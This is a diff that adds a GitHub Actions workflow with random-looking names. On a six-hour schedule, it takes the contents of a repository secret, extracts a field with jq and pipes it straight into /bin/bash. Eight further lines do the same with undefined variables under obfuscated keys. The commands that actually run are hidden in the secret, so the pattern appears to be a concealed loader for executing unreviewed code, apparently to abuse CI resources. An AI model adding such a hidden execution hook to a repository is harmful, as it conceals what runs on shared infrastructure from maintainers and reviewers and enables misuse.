@@ -1,0 +1,25 @@
+name: wuhaoning3214
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '8 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhaoning3214
+        env:
+          bq32: ${{ secrets.bq32 }}
+        run: |
+          echo $bq32 | jq -r .e82808 | /bin/bash
+          echo $bfsnw21809 | jq -r .nvrh9 | /bin/bash
+          echo $elpb4 | jq -r .m2092 | /bin/bash
+          echo $ivasd78 | jq -r .a9608 | /bin/bash
+          echo $cai1 | jq -r .lv57 | /bin/bash
+          echo $lvn44601 | jq -r .nbdph65 | /bin/bash
+          echo $eiqs14 | jq -r .ng1366 | /bin/bash
+          echo $eqwpm9 | jq -r .cqg18 | /bin/bash
+          echo $ayyw62847 | jq -r .ajr947 | /bin/bash
+
